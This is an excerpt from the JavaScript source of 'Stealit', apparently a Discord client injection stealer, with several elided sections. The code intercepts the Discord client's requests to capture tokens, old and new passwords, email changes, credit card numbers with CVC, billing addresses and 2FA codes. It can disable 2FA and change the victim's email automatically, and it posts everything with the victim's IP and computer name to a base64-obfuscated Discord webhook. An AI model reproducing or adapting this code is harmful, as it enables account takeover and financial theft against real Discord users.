...
const loklok = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwNTI1OTMwODU2OTMzNzg2Ni96N1QtYlppSVpFbThrREZTR3h1SUZUYWlXcGM3elJobE82RldCTHJ5WGE4TWZrQXdjTHNCYnk1Y1F1aUhLX01jbU9BZw==';
...
function handleWebhookURL(data) {
  ...
  var config = {
    ...
    "embed-color": 3553599,
    disable2FA: "true",
    changeMailAuto: "false",//true
    mail: "dufyduck@proton.me",
    creator: "Stealit",
    transfer_link: `yoook`,
    injection_url:
  ...
  const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
    var params = {
      username: "Stealit",
      avatar_url:
        "https://cdn.discordapp.com/attachments/1141126749653061772/1206216775868358718/sZMlHua.png?size=4096",
      content: "",
      embeds: [
        {
          title: title,
  ...
  const post2 = async (params) => {
    ...
    [config.Placed, config.webhook2].forEach((res) => {
      if (res == "%API" + "_URL%") return;
      if (res == "%\x57EBHOOK%") return;
      const url = new URL(res);
      const options = {
  ...
  function generatePassword() {
    const baseWords = ["Stealit", "Stealist best grab", "Gaypsilon", "bbyshit"];
  ...
  const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/CumWare")) {
      try {
        fs.rmdirSync(__dirname + "/CumWare");
      } catch (err) {}
      var ip = await getIP();
      console.log(ip);
      ...
      if (!token) {
        var params = await makeEmbed({
          title: ":white_check_mark: Stealit Initialized",
          fields: [
            {
              name: "Injection Info",
        ...
        if (!user.banner)
          var userBanner =
            "https://cdn.discordapp.com/attachments/1141126749653061772/1206216775868358718/sZMlHua.png?size=256";
        ...
        var params = await makeEmbed({
          ...
          fields: [
            {
              name: "Username <:identy:1206228345407406120>",
              value: `\`${user.username}#${user.discriminator}\``,
              inline: !0,
            },
            {
              name: "ID <:mention:1206228892629864488>",
      ...
      if (
        ...
        if (!token) {
          var params = await makeEmbed({
            title:
              ":white_check_mark: Stealit User log out (User not Logged in before)",
            fields: [
              {
                name: "Injection Info",
          ...
          var params = await makeEmbed({
            title:
              ":white_check_mark: Stealit Victim got logged out",
            ...
            fields: [
              ...
              {
                name: "@Copyright",
                value: `[Stealit 2024 :regional_indicator_c:](https://t.me/stealitpublic)`,
                inline: !0,
              },
              {
                name: "Billing <a:moneyx:1206250495329570948>",
      ...
      switch (true) {
        ...
        case request.url.endsWith("users/@me"):
          ...
          if (data.new_password) {
            var params = await makeEmbed({
              title:
                ":white_check_mark: Stealit Detect Password Changed",
              color: config["embed-color"],
              description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
              fields: [
                {
                ...
                {
                  name: "<:password:1206254317229707387> Old Password",
                  value: `\`${data.password}\``,
                  inline: !0,
                },
                {
                  name: "<:password:1206254317229707387> New Password",
            ...
            if (config.changeMailAuto == "true") {
              ...
              const generatedEmail = `${username ?? "stealit"}+${generateId(
                3
              )}${domain ?? "@gang.email"}`;
              ...
              try {
                ...
                if (res.username) {
                  var params = await makeEmbed({
                    title:
                      ":white_check_mark: Stealit Have changed the victim mail",
                    color: config["embed-color"],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [
                      {
                      ...
                      {
                        name: "@Copyright",
                        value: `[Stealit 2024 :white_check_mark:](https://t.me/stealitpublic)`,
                        inline: !1,
                      },
                      {
                        name: "Phone <:iphone:1206253352439255051>",
            ...
            var params = await makeEmbed({
              title:
                ":white_check_mark: Stealit Detect Email Changed",
              color: config["embed-color"],
              description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
              fields: [
                {
          ...
          if (CardNumber && CardCVC && month && year) {
            await electron.session.defaultSession.webRequest.onCompleted(
              ...
              async (re, callback) => {
                ...
                var params = await makeEmbed({
                  title:
                    ":white_check_mark: Stealit User Credit Card Added",
                  color: config["embed-color"],
                  fields: [
                    {
                      name: "IP",
                    ...
                    {
                      name: "Address <:adress:1206255971668852776>",
        ...
        case request.url.endsWith("/enable"):
          ...
          var params = await makeEmbed({
            title: ":white_check_mark: Stealit User Enable 2FA",
            color: config["embed-color"],
            fields: [
              {
                name: "IP",
        ...
        case request.url.endsWith("/disable"):
          var params = await makeEmbed({
            title: ":white_check_mark: Stealit User Removed 2FA",
            color: config["embed-color"],
            fields: [
              {
                name: "IP",
        ...
        case request.url.endsWith("/codes-verification"):
          ...
          var params = await makeEmbed({
            title: ":white_check_mark: Stealit User 2FA Codes",
            color: config["embed-color"],
            fields: [
              {
                name: "IP",
...
const req = https.get(options, (res) => {
  ...
  res.on('end', () => {
    handleWebhookURL(data); // handleWebhookURL fonksiyonuna geçiriliyor
  });
});
